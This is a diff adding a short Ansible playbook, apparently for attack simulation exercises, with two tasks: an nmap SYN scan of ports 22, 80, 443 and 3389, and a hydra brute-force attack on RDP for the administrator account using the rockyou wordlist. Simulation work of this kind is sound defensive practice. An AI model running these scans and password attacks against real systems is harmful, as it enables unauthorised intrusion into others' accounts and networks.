@@ -1,0 +1,13 @@
+---
+- name: Linux Attack Simulation
+  hosts: linux
+  tasks:
+    - name: Run Network Scanning
+      shell: |
+        nmap -sS -p 80,443,3389,22 {{ target_ip }}
+      when: simulation_type == "network_scan"
+
+    - name: Attempt Brute Force
+      shell: |
+        hydra -l administrator -P /usr/share/wordlists/rockyou.txt {{ target_ip }} rdp -t 1
+      when: simulation_type == "brute_force"
